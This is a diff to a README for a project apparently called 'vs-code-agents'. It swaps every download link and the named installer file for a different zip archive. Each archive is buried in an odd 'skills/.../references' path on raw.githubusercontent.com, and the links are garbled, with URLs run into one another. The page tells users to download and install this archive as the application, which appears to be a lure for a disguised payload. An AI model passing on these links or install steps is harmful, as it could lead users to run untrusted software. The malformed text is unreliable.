@@ -14,7 +14,7 @@ To get up and running with the **vs-code-agents**, follow the easy steps below. 
 
 Begin by going to the Releases page for the **vs-code-agents**. You can find it here:
 
-[![Download](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip%20VS%20Code%https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip)](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip)
+[![Download](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip%20VS%20Code%https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip)](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -22,7 +22,7 @@ On the Releases page, you will find a list of available versions. Each version w
 
 ### Step 3: Download the Installer
 
-Click on the version you choose. You will see a list of downloadable files related to that version. Look for the file named `https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip` or something similar. Click on this file to start the download.
+Click on the version you choose. You will see a list of downloadable files related to that version. Look for the file named `https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip` or something similar. Click on this file to start the download.
 
 ### Step 4: Install the Application
 
@@ -66,4 +66,4 @@ Thank you for choosing the **vs-code-agents**! We appreciate your interest and h
 
 For more information, visit our Releases page again:
 
-[![Download](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip%20VS%20Code%https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip)](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/document-lifecycle/references/code_agents_vs_3.0.zip)
+[![Download](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip%20VS%20Code%https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip)](https://raw.githubusercontent.com/15496-debug/vs-code-agents/main/vs-code-agents/skills/release-procedures/references/code_agents_vs_v2.5.zip)
